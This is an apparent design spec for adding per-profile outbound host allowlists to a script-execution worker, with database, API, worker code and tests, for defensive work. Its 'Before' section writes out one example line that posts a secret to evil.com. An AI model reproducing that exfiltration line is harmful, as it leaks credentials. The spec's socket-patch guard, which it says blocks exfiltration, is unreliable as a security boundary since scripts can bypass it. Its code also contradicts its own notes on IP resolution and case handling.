# Spec 5.3: Network Allowlists (Phase 5 → v0.5.0)

## Goal

Each profile can optionally specify a list of allowed outbound hosts. When set, scripts running under that profile can only reach those hosts. This prevents data exfiltration to arbitrary endpoints.

**Before:** Worker container has unrestricted outbound network access. A script can `httpx.post("https://evil.com", data=settings.get("SECRET"))`.
**After:** Profiles can have a network allowlist. When set, only allowlisted hosts are reachable from the worker during execution. Default (no allowlist) = all outbound allowed.

## Prerequisites

- Spec 3.1 (Profile System) ✅ — profiles with admin management
- Spec 4.1 (Execution Engine) ✅ — execution dispatch
- Spec 5.2 (Container Hardening) ✅ — worker container is managed

---

## Design Decision: Per-Execution DNS Filtering

Network allowlists are enforced **per execution**, not per container. Since we have a single long-running worker container, we can't change iptables rules between executions without race conditions.

Instead, we use a **DNS-based approach at the script level**:

1. Profile stores an `allowed_hosts` list (nullable — NULL means all allowed)
2. When dispatching an execution, Airlock passes the allowlist to the worker alongside settings
3. The worker injects a network guard that intercepts outbound connections
4. Connections to non-allowlisted hosts are blocked with a clear error

This approach is simpler than iptables manipulation and doesn't require privileged Docker operations.

---

## Architecture

```
Profile (admin sets allowlist)
    │
    │ allowed_hosts: ["api.oracle.com", "db.example.com"]
    │
    ▼
POST /execute
    │
    │ Resolve credentials + allowlist
    │
    ▼
Worker receives:
  {script, settings, timeout, allowed_hosts}
    │
    ▼
Worker SDK patches socket.create_connection
  → Before each connection, check host against allowlist
  → Allowed: proceed normally
  → Blocked: raise NetworkBlockedError("Host not in allowlist: evil.com")
```

---

## Tasks

### 1. Add Allowlist to Profiles — Update `src/airlock/db.py`

Add `allowed_hosts` column to profiles table:

```sql
ALTER TABLE profiles ADD COLUMN allowed_hosts TEXT;  -- JSON array or NULL
```

Add to MIGRATIONS and update SCHEMA. NULL means all hosts allowed. Empty array `[]` means no outbound allowed.

### 2. Update Profile Service — `src/airlock/services/profiles.py`

- `create_profile()` — no change (allowed_hosts defaults to NULL)
- `update_profile()` — accept optional `allowed_hosts: list[str] | None`
- `get_profile()` / `list_profiles()` — include `allowed_hosts` in response
- New: `get_profile_allowed_hosts(db, profile_id) -> list[str] | None`

### 3. Admin API — Update `src/airlock/api/admin.py`

#### `PUT /api/admin/profiles/{id}` — Accept `allowed_hosts`

```json
Request:
{
  "allowed_hosts": ["api.oracle.com", "db.example.com"]
}

Response:
{
  "id": "...",
  "allowed_hosts": ["api.oracle.com", "db.example.com"],
  ...
}
```

- `allowed_hosts: null` → clear allowlist (all hosts allowed)
- `allowed_hosts: []` → block all outbound
- `allowed_hosts: ["host1", "host2"]` → only those hosts
- Can be set on both locked and unlocked profiles (operational control, not structural change)

### 4. Update Worker Protocol — Worker receives allowlist

Update `WorkerManager.execute()` to pass `allowed_hosts`:

```python
async def execute(
    self, script: str, settings: dict[str, str] | None = None,
    timeout: int = 60, allowed_hosts: list[str] | None = None
) -> dict[str, Any]:
    resp = await self._client.post(
        "/run",
        json={
            "script": script,
            "settings": settings or {},
            "timeout": timeout,
            "allowed_hosts": allowed_hosts,
        },
        timeout=http_timeout,
    )
```

### 5. Update Worker — Network Guard in `worker/server.py`

Add `allowed_hosts` to `RunRequest` and inject a network guard before executing the script:

```python
class RunRequest(BaseModel):
    script: str
    settings: dict[str, str] = {}
    timeout: int = 60
    allowed_hosts: list[str] | None = None  # None = all allowed


class NetworkBlockedError(Exception):
    """Raised when a script tries to connect to a non-allowlisted host."""
    pass


def _create_network_guard(allowed_hosts: list[str]):
    """Create a socket wrapper that enforces the host allowlist."""
    import socket
    _original_create_connection = socket.create_connection

    def _guarded_create_connection(address, *args, **kwargs):
        host = address[0] if isinstance(address, tuple) else address
        # Resolve hostname for comparison
        if host not in allowed_hosts:
            # Check if it's an IP that resolves to an allowed host
            try:
                resolved = socket.gethostbyaddr(host)[0]
                if resolved not in allowed_hosts:
                    raise NetworkBlockedError(
                        f"Network access blocked: '{host}' is not in the allowed hosts list. "
                        f"Allowed: {', '.join(allowed_hosts)}"
                    )
            except (socket.herror, socket.gaierror):
                raise NetworkBlockedError(
                    f"Network access blocked: '{host}' is not in the allowed hosts list. "
                    f"Allowed: {', '.join(allowed_hosts)}"
                )
        return _original_create_connection(address, *args, **kwargs)

    return _guarded_create_connection, _original_create_connection
```

In the `/run` endpoint, install the guard before executing and restore after:

```python
@app.post("/run")
async def run(request: RunRequest) -> RunResponse:
    guard_installed = False
    original_create_connection = None

    if request.allowed_hosts is not None:
        import socket
        guarded, original_create_connection = _create_network_guard(request.allowed_hosts)
        socket.create_connection = guarded
        guard_installed = True

    try:
        # ... existing execution logic ...
    finally:
        if guard_installed and original_create_connection:
            import socket
            socket.create_connection = original_create_connection
```

### 6. Wire Allowlist into Execution Dispatch — Update `src/airlock/api/agent.py`

In `_dispatch_to_worker`, resolve and pass the allowlist:

```python
async def _dispatch_to_worker(
    db, worker, execution_id, script, settings, timeout, allowed_hosts
):
    # ... existing dispatch logic ...
    result = await worker.execute(script, settings, timeout, allowed_hosts=allowed_hosts)
```

In the `execute` endpoint, resolve the allowlist from the profile:

```python
# After resolving credentials
allowed_hosts = await get_profile_allowed_hosts(db, profile.profile_id)

# Pass to dispatch
background.add_task(
    _dispatch_to_worker, db, worker, execution_id,
    body.script, settings, body.timeout, allowed_hosts
)
```

### 7. Update Pydantic Models

Add `allowed_hosts` to profile request/response models:

```python
class UpdateProfileRequest(BaseModel):
    description: str | None = None
    expires_at: str | None = None
    allowed_hosts: list[str] | None = None  # None = don't change, use sentinel

class ProfileResponse(BaseModel):
    # ... existing fields ...
    allowed_hosts: list[str] | None = None
```

---

## What Does NOT Change

- Credential system — unchanged
- Output sanitization (5.1) — independent
- Container resource limits (5.2) — independent
- LLM pause/resume — unchanged

## What This Enables

After this spec:
- Admins can restrict which hosts a profile's scripts can reach
- Data exfiltration is blocked — scripts can't send credentials to arbitrary endpoints
- Default behavior (no allowlist) is unchanged — backward compatible
- Clear error messages when scripts try blocked hosts
- Allowlists can be updated on locked profiles (operational, not structural)

---

## Tests

### Unit Tests — `tests/test_network_allowlist.py` (new file)

#### Profile Allowlist CRUD
- Create profile → `allowed_hosts` is NULL by default
- Update profile with `allowed_hosts: ["api.oracle.com"]` → stored
- Update profile with `allowed_hosts: null` → clears allowlist
- Update profile with `allowed_hosts: []` → empty array stored (block all)
- Allowlist visible in `GET /profiles/{id}` response
- Allowlist can be set on locked profiles (not a structural change)

#### Network Guard
- `allowed_hosts: null` (no allowlist) → all connections succeed
- `allowed_hosts: ["api.example.com"]` → connection to api.example.com succeeds
- `allowed_hosts: ["api.example.com"]` → connection to evil.com raises NetworkBlockedError
- `allowed_hosts: []` → all connections blocked
- Guard is removed after execution (doesn't affect next execution)

#### Integration (with execution, requires Docker)
- Execute with allowlist including target host → HTTP request succeeds
- Execute with allowlist NOT including target host → error status with clear message
- Execute with no allowlist → all requests succeed (backward compatible)

### Existing Tests
- All existing tests must pass
- Profile tests may need minor updates for new `allowed_hosts` field

---

## Implementation Order

1. Update `src/airlock/db.py` — add `allowed_hosts` column + migration
2. Update `src/airlock/services/profiles.py` — allowlist in CRUD + `get_profile_allowed_hosts()`
3. Update `src/airlock/models.py` — add `allowed_hosts` to profile models
4. Update `src/airlock/api/admin.py` — accept `allowed_hosts` in profile update
5. Update `src/airlock/worker/server.py` — network guard implementation
6. Update `src/airlock/worker_manager.py` — pass `allowed_hosts` to worker
7. Update `src/airlock/api/agent.py` — resolve and pass allowlist in dispatch
8. `tests/test_network_allowlist.py` — all tests
9. Verify all existing tests pass

---

## Acceptance Criteria

- [ ] `allowed_hosts` column exists on profiles table (nullable JSON)
- [ ] Admin can set/clear allowlist via `PUT /api/admin/profiles/{id}`
- [ ] Allowlist visible in profile responses (admin + agent API)
- [ ] Allowlist can be set on locked profiles
- [ ] Worker receives allowlist alongside settings
- [ ] Script connecting to allowed host → succeeds
- [ ] Script connecting to non-allowed host → clear error
- [ ] No allowlist (NULL) → all connections allowed (default behavior)
- [ ] Empty allowlist (`[]`) → all connections blocked
- [ ] Network guard cleaned up after each execution
- [ ] All new tests pass
- [ ] All existing tests pass

---

## Notes for CC

- The `allowed_hosts` column is nullable TEXT storing a JSON array. NULL = all allowed. `"[]"` = block all. Use `json.dumps`/`json.loads`.
- The network guard patches `socket.create_connection` — this is the low-level function that `httpx`, `requests`, `urllib`, etc. all use. Patching it catches all outbound TCP connections.
- **Thread safety**: The worker runs scripts in threads. The socket monkey-patch affects the entire process. For single-script-at-a-time execution this is fine. If we later support concurrent executions in one worker, we'd need per-thread socket control — but that's a future concern.
- The guard must be restored in a `finally` block to prevent leaking into subsequent executions.
- Host comparison should be case-insensitive (DNS is case-insensitive).
- Don't try to resolve IPs to hostnames for matching — just compare the string the script provides against the allowlist. If the script uses an IP directly and the allowlist has hostnames, it won't match. This is intentional (explicit allowlisting).
- The `UpdateProfileRequest` sentinel for "don't change" needs careful handling. Since `None` in JSON means "clear the allowlist", you may need a separate sentinel or a wrapper to distinguish "not provided" from "set to null". Consider using `Annotated` with a sentinel default, or handle at the API layer.
